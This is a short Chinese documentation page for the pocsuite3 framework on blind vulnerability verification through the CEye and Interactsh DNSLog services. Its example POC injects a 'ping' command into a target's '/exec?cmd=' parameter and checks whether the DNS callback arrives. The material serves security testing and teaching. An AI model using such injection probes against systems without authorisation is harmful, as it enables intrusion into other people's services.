# DNSLog 盲打

> 需要无回显验证漏洞时使用 CEye 或 Interactsh。

```python
from pocsuite3.api import CEye, Interactsh
```

| API | 说明 |
|-----|------|
| `CEye` | Ceye DNSLog 平台 |
| `Interactsh` | Interactsh DNSLog（兼容 Nuclei） |

## 典型用法

```python
from pocsuite3.api import CEye, logger

class MyPOC(POCBase):
    def _verify(self):
        # 生成 DNSLog 子域名
        domain = CEye().get_subdomain()

        # 注入 payload 中
        payload = f'ping -c 1 {domain}'
        requests.get(self.url + '/exec?cmd=' + payload)

        # 检查是否收到 DNS 请求
        if CEye().verify(domain):
            result['VerifyInfo'] = {'DNSLog': domain}
            return self.parse_output(result)
        return self.parse_output({})
```
